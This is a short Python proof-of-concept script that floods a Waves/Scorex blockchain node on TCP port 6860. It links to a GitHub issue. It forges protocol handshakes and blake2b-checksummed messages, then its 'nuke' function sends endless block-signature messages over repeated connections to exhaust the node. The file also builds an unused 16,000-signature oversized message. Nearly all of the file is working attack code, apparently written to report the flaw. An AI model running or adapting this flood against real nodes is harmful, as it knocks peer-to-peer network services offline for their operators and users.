#!/usr/bin/python3

# More details: https://github.com/wavesplatform/Scorex/issues/109#issuecomment-249111898

import socket, time, random, struct
from pyblake2 import blake2b
from multiprocessing import Pool

target = "127.0.0.1"

TCP_PORT = 6860
BUFFER_SIZE = 1024
CONNECTIONS = 1

def generate_handshake():
    import random
    nonce = b""
    for i in range(8):
        nonce += bytearray((random.randint(0,255),))
    HANDSHAKE = b"""\x05\x77\x61\x76\x65\x73\x00\x00\
\x00\x00\x00\x00\x00\x02\x00\x00\
\x00\x04\x05\x62\x63\x64\x65\x76""" + nonce + b"""\
\x00\x00\x00\x00\x00\x00\x00\x00\
\x57\xda\x74\xf9"""
    return HANDSHAKE

def generate_message(msgCode, data):
    # Message:
    # Length - 4 bytes, 0x100000 is MAX
    # MAGIC - 4 bytes - \x12\x34\x56\x78
    # 
    # Message code - 1 byte
    # Data length - 4 bytes signed
    # Data checksum - 4 bytes - algorithm unknown
    # Data - length bytes

    MAGIC = b'\x12\x34\x56\x78'
    a=blake2b(digest_size=32);a.update(data);crc=a.digest()[:4]
    message_size = len(data) + len(MAGIC) + len(crc) + len(msgCode) + 4
    return struct.pack(">L", message_size) + MAGIC + msgCode + struct.pack(">L", len(data)) + crc + data

def generate_message_send_signatures():
    # Data length - 4 bytes
    # For data_length:
    #   Signature - 64 bytes
    data = []
    peers = 16000
    for i in range(peers):
        for u in range(64):
            data.append(bytearray((random.randint(0, 255), )))
    data = b''.join(data)
    data = struct.pack(">L", peers) + data
    return generate_message(b'\x15', data)

def generate_message_send_block_signature():
    #   Signature - 64 bytes
    data = []
    for u in range(64):
        data.append(bytearray((random.randint(0, 255), )))
    data = b''.join(data)
    return generate_message(b'\x16', data)

def nuke(meh):
    while True:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((target, TCP_PORT))
            s.send(generate_handshake())
            time.sleep(0.1)
            while True:
#                time.sleep(1)
                s.send(generate_message_send_block_signature())
            time.sleep(1)
            s.close()
        except ConnectionRefusedError:
            pass
        except Exception:
            import traceback
            traceback.print_exc()
        time.sleep(1)
        print("New try...")

p = Pool(CONNECTIONS)
p.map(nuke, range(CONNECTIONS))
time.sleep(666666)
